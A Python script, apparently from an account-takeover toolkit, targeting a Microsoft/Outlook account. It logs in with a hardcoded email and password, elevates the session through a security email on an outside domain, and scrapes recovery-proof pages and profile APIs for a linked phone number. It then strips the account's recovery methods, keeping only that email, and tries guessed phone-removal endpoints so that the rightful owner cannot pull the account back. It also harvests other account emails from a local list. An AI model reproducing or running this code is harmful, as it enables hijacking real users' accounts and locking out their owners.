#!/usr/bin/env python3
"""Deep HasPhone=1 investigation for mcfa survivor.

Questions:
1. What does HasPhone actually mean in GetCredentialType?
2. Can we recover the linked phone number?
3. Can we clear/remove it?
4. Is it a false/stale flag?

Also samples HasPhone across other known secured accounts for baseline.
"""
from __future__ import annotations

import asyncio
import json
import re
import sys
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from securing.auth.get_msaauth import get_msaauth  # noqa: F401 — kept for reference
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.autobuy_hold_check import fetch_credential_type
from securing.utils.cookies.get_amc import get_amc
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_pwd import login_pwd
from securing.utils.ogi.amc_headers import amc_api_headers
from securing.utils.ogi.get_contacts import get_contacts
from securing.utils.proxy import close_session
from securing.utils.security.remove_proof import (
    _extract_json_array,
    remove_proof,
)
from securing.utils.security_information import security_information

EMAIL = "mcfa.uhtn6av7@outlook.com"
PWD = "FjU3K9ZG7LuxCg"
SEC = "0c33a830a1754f1f@ilovevbucks.site"
OUT = Path(__file__).resolve().parents[1] / "forensics" / "mcfa_hasphone_probe.json"

# Other secured accounts for HasPhone baseline (email only — GCT is unauthenticated)
BASELINE_EMAILS = [
    EMAIL,
    "sunny5f4dce21f7f9@outlook.com",
    "imnotsteak.jyz494e8@outlook.com",
]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _phoneish_keys(obj, path="$"):
    hits = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            p = f"{path}.{k}"
            kl = str(k).lower()
            if any(t in kl for t in ("phone", "sms", "mobile", "msisdn", "tel")):
                hits.append({"path": p, "value": v})
            hits.extend(_phoneish_keys(v, p))
    elif isinstance(obj, list):
        for i, v in enumerate(obj[:50]):
            hits.extend(_phoneish_keys(v, f"{path}[{i}]"))
    return hits


def _extract_serverdata_keys(html: str) -> dict:
    """Pull selected ServerData keys from proofs manage HTML."""
    out = {}
    keys = [
        "smsProofs",
        "phoneProofs",
        "emailProofs",
        "totpProofs",
        "appProofs",
        "passkeyProofs",
        "windowsHelloProofs",
        "alternateEmailProofs",
        "fHasPhone",
        "fHasAuthenticator",
        "fHasFido",
        "fSMSEnabled",
        "iPhoneNumber",
        "sPhoneNumber",
        "arrUserProofs",
        "apiCanary",
    ]
    for key in keys:
        arr = _extract_json_array(html, key)
        if arr is not None:
            out[key] = arr
            continue
        # scalar / bool / string
        m = re.search(
            rf'"{re.escape(key)}"\s*:\s*(true|false|null|-?\d+|"(?:\\.|[^"\\])*")',
            html or "",
        )
        if m:
            raw = m.group(1)
            try:
                out[key] = json.loads(raw)
            except Exception:
                out[key] = raw
    # any phone-looking display strings
    out["_phone_displays"] = re.findall(
        r'(?:\+\d[\d\s\-()]{6,}\d|\*\*\*\*\*\d{2,4}|x{2,}\d{2,4})',
        html or "",
        re.I,
    )[:30]
    out["_mentions"] = {
        "sms": len(re.findall(r"sms|text message|phone number", html or "", re.I)),
        "hasphone_lit": len(re.findall(r"HasPhone|fHasPhone", html or "")),
    }
    return out


async def baseline_gct(report: dict) -> None:
    report["baseline_gct"] = []
    # Also parse a few clean emails from cft list
    emails = list(BASELINE_EMAILS)
    p = Path("/root/cft/account list.txt")
    if p.exists():
        for line in p.read_text().splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line and ":" not in line:
                # formats vary — try first token with @
                pass
            # prefer email:rc:pwd or email first
            for tok in re.split(r"[\s=:]+", line):
                if "@outlook.com" in tok.lower() or "@hotmail.com" in tok.lower():
                    emails.append(tok.strip().lower())
                    break
            if len(emails) >= 12:
                break
    seen = set()
    for e in emails:
        e = e.strip().lower()
        if not e or e in seen or "@" not in e:
            continue
        seen.add(e)
        gct = await fetch_credential_type(e)
        creds = (gct or {}).get("Credentials") or {}
        row = {
            "email": e,
            "IfExistsResult": (gct or {}).get("IfExistsResult"),
            "HasPhone": creds.get("HasPhone"),
            "HasFido": creds.get("HasFido"),
            "HasPassword": creds.get("HasPassword"),
            "HasRemoteNGC": creds.get("HasRemoteNGC"),
            "PrefCredential": creds.get("PrefCredential"),
            "otc_displays": [
                p.get("display") for p in (creds.get("OtcLoginEligibleProofs") or [])
            ],
            "otc_types": [
                p.get("type") for p in (creds.get("OtcLoginEligibleProofs") or [])
            ],
            "all_cred_keys": sorted(creds.keys()) if creds else [],
            "phoneish": _phoneish_keys(creds) if creds else [],
        }
        report["baseline_gct"].append(row)
        print(
            f"GCT {e}: HasPhone={row['HasPhone']} otc={row['otc_displays']} "
            f"IfExists={row['IfExistsResult']}"
        )


async def deep_probe(report: dict) -> None:
    session = get_session()
    try:
        print("=== login ===")
        live = await livedata(session)
        page = await login_pwd(
            session, EMAIL, live["urlPost"], PWD, live["ppft"]
        )
        msa = get_data(page)
        handled = await handle_redirects(session, page)
        if isinstance(handled, dict) and handled.get("urlPost"):
            msa = handled
        elif isinstance(handled, str):
            msa = get_data(handled) or msa
        if not msa or not msa.get("urlPost"):
            if not (
                has_cookie(session, "__Host-MSAAUTH")
                or has_cookie(session, "MSPAuth")
            ):
                report["login_ok"] = False
                report["login_error"] = "no MSAAUTH after password"
                print("LOGIN FAIL")
                return
            msa = {"_cookies_only": True}
        await polish_host(session, msa)
        # Elevate proofs session via security email (needed for manage pages)
        try:
            si = await security_information(
                session,
                security_email=SEC,
                account_email=EMAIL,
                password=PWD,
            )
            report["security_information_ok"] = isinstance(si, dict)
            report["security_information_keys"] = (
                list(si.keys()) if isinstance(si, dict) else str(si)[:200]
            )
            if isinstance(si, dict) and si.get("apicanary"):
                report["_si_canary"] = si.get("apicanary")
        except Exception as exc:
            report["security_information_error"] = repr(exc)
        report["login_ok"] = True

        # Full GCT after auth cookies exist (still username-based)
        gct = await fetch_credential_type(EMAIL)
        report["gct_post_login"] = gct
        creds = (gct or {}).get("Credentials") or {}
        print("HasPhone post-login:", creds.get("HasPhone"))
        print("Full Credentials keys:", sorted(creds.keys()))
        print("Otc proofs:", json.dumps(creds.get("OtcLoginEligibleProofs"), indent=2)[:1500])

        # Contacts
        try:
            tokens = await get_amc(session)
        except Exception as exc:
            tokens = {}
            report["amc_error"] = str(exc)
        profile = (tokens or {}).get("profile") or (tokens or {}).get("home")
        contacts = None
        if profile:
            try:
                contacts = await get_contacts(session, profile)
            except Exception as exc:
                report["contacts_error"] = str(exc)
        report["contacts"] = contacts
        print("contacts phoneish:", _phoneish_keys(contacts) if contacts else None)

        # names/manage aliases — phone aliases?
        r = await session.get(
            "https://account.live.com/names/manage", follow_redirects=True
        )
        names_html = r.text or ""
        report["names_manage"] = {
            "status": r.status_code,
            "url": str(r.url),
            "phone_mentions": re.findall(
                r"phone|sms|mobile|\+\d{6,}", names_html, re.I
            )[:40],
            "aliases": re.findall(
                r"[\w.+\-]+@(?:outlook|hotmail|live|msn)\.com", names_html, re.I
            )[:20],
        }

        # proofs manage deep scrape
        proofs_urls = [
            "https://account.live.com/proofs/Manage/additional",
            "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
            "https://account.live.com/proofs/manage",
            "https://account.live.com/proofs/Add?pt=SMS",
            "https://account.live.com/proofs/Add?pt=Phone",
        ]
        report["proofs_pages"] = {}
        canary = None
        for url in proofs_urls:
            rr = await session.get(url, follow_redirects=True)
            html = rr.text or ""
            sd = _extract_serverdata_keys(html)
            if sd.get("apiCanary"):
                canary = sd["apiCanary"]
            report["proofs_pages"][url] = {
                "status": rr.status_code,
                "final_url": str(rr.url),
                "len": len(html),
                "serverdata": sd,
                "phoneish_text_sample": [
                    m.group(0)
                    for m in re.finditer(
                        r".{0,40}(?:phone|sms|mobile|HasPhone).{0,40}",
                        html,
                        re.I,
                    )
                ][:15],
            }
            print(
                f"proofs {url} -> {rr.status_code} sms={sd.get('smsProofs')} "
                f"fHasPhone={sd.get('fHasPhone')} phones={sd.get('_phone_displays')}"
            )

        # AMC profile / phones APIs
        if profile:
            amc_urls = [
                (
                    "contact-info",
                    "https://account.microsoft.com/profile/api/v1/contact-info?includeEmails=true&includePhones=true&includeAddresses=true&includePermissionLink=true",
                ),
                (
                    "phones",
                    "https://account.microsoft.com/profile/api/v1/phones",
                ),
                (
                    "security-info",
                    "https://account.microsoft.com/security/api/proofs",
                ),
                (
                    "security-overview",
                    "https://account.microsoft.com/security/api/security-info",
                ),
            ]
            report["amc_apis"] = {}
            for label, url in amc_urls:
                h = amc_api_headers(session, profile, qos_root=f"HasPhone.{label}")
                rr = await session.get(url, headers=h, follow_redirects=True)
                try:
                    body = rr.json()
                except Exception:
                    body = (rr.text or "")[:4000]
                report["amc_apis"][label] = {
                    "status": rr.status_code,
                    "body": body,
                    "phoneish": _phoneish_keys(body),
                }
                print(f"AMC {label}: {rr.status_code} phoneish={_phoneish_keys(body)[:5]}")

        # Attempt: remove_proof again (should delete 0 SMS) then re-check HasPhone
        canary = report.get("_si_canary") or canary
        if canary:
            print("=== remove_proof wipe attempt ===")
            wipe = await remove_proof(
                session,
                canary,
                keep_security_email=SEC,
                keep_domain="ilovevbucks.site",
            )
            report["remove_proof"] = wipe
        else:
            # try extract canary from last html
            for page in report["proofs_pages"].values():
                c = (page.get("serverdata") or {}).get("apiCanary")
                if c:
                    canary = c
                    break
            report["remove_proof"] = {"skipped": "no canary", "canary_found": bool(canary)}
            if canary:
                wipe = await remove_proof(
                    session,
                    canary,
                    keep_security_email=SEC,
                    keep_domain="ilovevbucks.site",
                )
                report["remove_proof"] = wipe

        # Try speculative Clear / Unlink phone APIs (read response only — safe if 404)
        speculative = []
        if canary:
            candidates = [
                ("POST", "https://account.live.com/API/Proofs/DeleteProof", {"proofId": "", "uaid": "x", "uiflvr": 1001, "scid": 100109, "hpgid": 201030}),
                ("POST", "https://account.live.com/API/Proofs/ClearPhone", {}),
                ("POST", "https://account.live.com/API/Proofs/RemovePhone", {}),
                ("POST", "https://account.live.com/API/Proofs/DisableSMS", {}),
                ("POST", "https://account.live.com/API/Proofs/MarkPhoneLost", {}),
            ]
            for method, url, payload in candidates:
                try:
                    rr = await session.post(
                        url,
                        headers={
                            "Content-Type": "application/json; charset=UTF-8",
                            "X-Requested-With": "XMLHttpRequest",
                            "Accept": "application/json",
                            "canary": canary,
                        },
                        json=payload,
                    )
                    speculative.append(
                        {
                            "url": url,
                            "status": rr.status_code,
                            "body": (rr.text or "")[:500],
                        }
                    )
                    print(f"speculative {url} -> {rr.status_code} {(rr.text or '')[:120]}")
                except Exception as exc:
                    speculative.append({"url": url, "error": str(exc)})
        report["speculative_clear_apis"] = speculative

        # Forgot-password / recover offered proofs (does MS still offer SMS?)
        # Do NOT complete reset — only list options if possible via GCT with checkPhones
        gct2 = await fetch_credential_type(EMAIL)
        report["gct_after_wipe"] = {
            "HasPhone": ((gct2 or {}).get("Credentials") or {}).get("HasPhone"),
            "OtcLoginEligibleProofs": ((gct2 or {}).get("Credentials") or {}).get(
                "OtcLoginEligibleProofs"
            ),
            "raw_credentials": (gct2 or {}).get("Credentials"),
        }
        print("HasPhone AFTER wipe:", report["gct_after_wipe"]["HasPhone"])

        # Password reset start — capture whether SMS is offered (stop before any mutation)
        try:
            pr = await session.get(
                "https://account.live.com/password/reset", follow_redirects=True
            )
            report["password_reset_landing"] = {
                "url": str(pr.url),
                "status": pr.status_code,
                "has_sms_wording": bool(
                    re.search(r"text|sms|phone", pr.text or "", re.I)
                ),
                "snippet_proofs": [
                    m.group(0)
                    for m in re.finditer(
                        r".{0,30}(?:phone|sms|text message|email).{0,30}",
                        pr.text or "",
                        re.I,
                    )
                ][:20],
            }
        except Exception as exc:
            report["password_reset_landing"] = {"error": str(exc)}

    finally:
        await close_session(session)


async def main():
    report = {"target": EMAIL, "started": _now()}
    skip_baseline = False
    import os

    skip_baseline = os.environ.get("SKIP_BASELINE", "").strip() in ("1", "true", "yes")
    if skip_baseline and OUT.exists():
        prev = json.loads(OUT.read_text())
        report["baseline_gct"] = prev.get("baseline_gct")
        report["baseline_summary"] = prev.get("baseline_summary")
        print("=== reused baseline from previous run ===")
        print(report.get("baseline_summary"))
    else:
        print("=== baseline GCT across accounts ===")
        await baseline_gct(report)

        # Summary counts
        vals = [
            r.get("HasPhone")
            for r in report["baseline_gct"]
            if r.get("IfExistsResult") == 0
        ]
        report["baseline_summary"] = {
            "existing_accounts": len(vals),
            "HasPhone_1": sum(1 for v in vals if v in (1, "1", True)),
            "HasPhone_0": sum(1 for v in vals if v in (0, "0", False)),
            "HasPhone_other": [
                {"email": r["email"], "HasPhone": r["HasPhone"]}
                for r in report["baseline_gct"]
                if r.get("IfExistsResult") == 0
                and r.get("HasPhone") not in (0, 1, "0", "1", True, False)
            ],
        }
        print("BASELINE SUMMARY", report["baseline_summary"])

    print("\n=== deep authenticated probe ===")
    await deep_probe(report)
    report["finished"] = _now()

    # Verdict helper
    sms_empty = True
    for page in (report.get("proofs_pages") or {}).values():
        sd = page.get("serverdata") or {}
        if sd.get("smsProofs") or sd.get("phoneProofs"):
            sms_empty = False
    contacts = report.get("contacts") or {}
    msa = contacts.get("msaPhones") if isinstance(contacts, dict) else None
    mmx = contacts.get("mmxPhones") if isinstance(contacts, dict) else None
    has_phone = report.get("gct_after_wipe", {}).get("HasPhone")
    baseline = report.get("baseline_summary") or {}
    rate = None
    if baseline.get("existing_accounts"):
        rate = baseline["HasPhone_1"] / baseline["existing_accounts"]

    report["verdict"] = {
        "HasPhone_still": has_phone,
        "visible_sms_or_phone_proof": not sms_empty,
        "msaPhones": msa,
        "mmxPhones": mmx,
        "number_recoverable_via_consumer_api": bool(
            (msa or mmx)
            or any(
                (p.get("serverdata") or {}).get("_phone_displays")
                for p in (report.get("proofs_pages") or {}).values()
            )
        ),
        "cleared_by_DeleteProof": has_phone not in (1, "1", True),
        "baseline_HasPhone_rate_among_existing": rate,
        "interpretation": (
            "If baseline rate is high (~most secured Outlook accounts show HasPhone=1 "
            "with empty smsProofs), treat as STALE/FALSE-ISH flag with weak pullback signal. "
            "If baseline rate is low and only tainted accounts show it, treat as real ghost "
            "SMS recovery eligibility. Number is only recoverable if smsProofs/contacts expose it."
        ),
    }
    OUT.write_text(json.dumps(report, indent=2, default=str))
    print("\nWrote", OUT)
    print(json.dumps(report["verdict"], indent=2))


if __name__ == "__main__":
    asyncio.run(main())
